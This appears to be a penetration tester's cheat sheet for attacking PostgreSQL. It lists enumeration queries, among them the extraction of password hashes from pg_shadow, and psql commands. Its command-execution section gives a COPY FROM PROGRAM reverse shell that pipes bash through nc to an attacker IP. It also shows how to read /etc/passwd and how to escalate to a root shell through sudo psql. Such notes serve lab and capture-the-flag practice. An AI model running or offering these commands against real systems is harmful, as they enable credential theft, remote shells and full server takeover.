For SQLi, refer to PayloadAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

## Enumeration

PostgreSQL Enumeration Oneliners
```
DBMS version 	SELECT version()
Database Name 	SELECT CURRENT_DATABASE()
Database Schema 	SELECT CURRENT_SCHEMA()
List PostgreSQL Users 	SELECT usename FROM pg_user
List Password Hashes 	SELECT usename, passwd FROM pg_shadow
List DB Administrators 	SELECT usename FROM pg_user WHERE usesuper IS TRUE
Current User 	SELECT user;
Current User 	SELECT current_user;
Current User 	SELECT session_user;
Current User 	SELECT usename FROM pg_user;
Current User 	SELECT getpgusername();
```

PostgreSQL Methodology
```
List Schemas 	
	SELECT DISTINCT(schemaname) FROM pg_tables
List Databases 	
	SELECT datname FROM pg_database
List Tables 	
	SELECT table_name FROM information_schema.tables
List Tables 	
	SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'
List Tables 	
	SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'
List Columns 	
	SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```


PSQL Meta Commands
```bash
# Connect
psql -h <db-address> -d <db-name> -U <username> -W
	-W forces psql to ask for the user password before connection
	-p to specify port
	default user:pass is postgres:postgres

# List all databases
\l

# Switch databases
\c <database_name>

# List database tables
\dt

# Describe a table
\d
\d+ <table_name>
	more info about a table

# Output all info from table
SELECT * FROM table_name;

# List all schemas
\dn

# List all users and their roles
\du
\du <username>
	specific users

# List all functions
\df

# List all views
\dv

# Save query results to a file
\o <file_name>

# Run commands from a file
\i <file_name>
	for example if you have a .txt file that does \l \dt \du you can do it all at once

# Quit
	\q

```

## Command Execution

PSQL Command Exec/File Read -- See [link](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)
```bash
1.
# 'superuser' must be apresent attrubute of user

\du

2.
# Get users roles
# pg_execute_server_program must be present

SELECT 
      r.rolname, 
      r.rolsuper, 
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolconnlimit, r.rolvaliduntil,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;


3.1: command exec/reverse shell:

	CREATE TABLE shell(output text);
	
	Start listener on Attack box
	
	COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attack_ip> <listen port> >/tmp/f';
	#any rev shell can go here


3.2: file read:

	CREATE TABLE read_files(output text);
	
	COPY read_files FROM ('/etc/passwd');
	
	SELECT * FROM read_files;

```

## Privesc (sudo -l)
sudo psql privesc
```bash
# First add role for root (requires postgres/superuser access already)

CREATE ROLE root WITH LOGIN SUPERUSER PASSWORD 'password';
\q

# run psql as root

sudo psql -w postgres

# priv esc

\?
! /bin/bash
```
